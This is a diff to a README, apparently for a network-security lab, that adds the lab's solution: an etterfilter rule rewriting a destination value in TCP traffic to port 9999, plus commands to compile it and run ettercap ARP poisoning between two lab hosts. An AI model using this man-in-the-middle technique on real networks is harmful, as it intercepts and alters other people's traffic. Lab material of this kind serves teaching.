@@ -25,7 +25,18 @@ should be fairly easy.
 
 # winning
 the original solution to this project uses `ettercap` to ARP poison the network
-and hijack traffic between clients and the server.
+and etterfilter to modify traffic before passing it to the real server. create
+a filter file.
+###### filter.ecf
+> if (ip.proto == TCP && tcp.dst == 9999 && regex(DATA.data, "dest=13333"))  
+> {  
+>     msg("Filter running");  
+>     replace("dest=13333", "dest=19001");  
+> }  
+
+then compile it with `etterfilter filter.ecf -o f.ef` and finally run ettercap
+`ettercap -T -i eth1 -F f.ef -M arp /10.1.1.2// /10.1.1.5//9999` (replace hosts
+and interfaces with appropriate hosts and interfaces from your network).
 
 # setup
 #### network setup
